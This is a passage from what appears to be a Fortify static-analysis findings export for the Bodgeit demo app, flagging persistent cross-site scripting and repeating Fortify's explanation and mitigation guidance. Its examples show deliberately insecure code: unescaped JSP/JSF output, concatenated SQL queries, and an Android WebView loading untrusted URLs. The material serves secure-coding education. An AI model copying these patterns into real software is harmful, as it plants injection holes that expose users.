HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","224","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/product.jsp","","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically 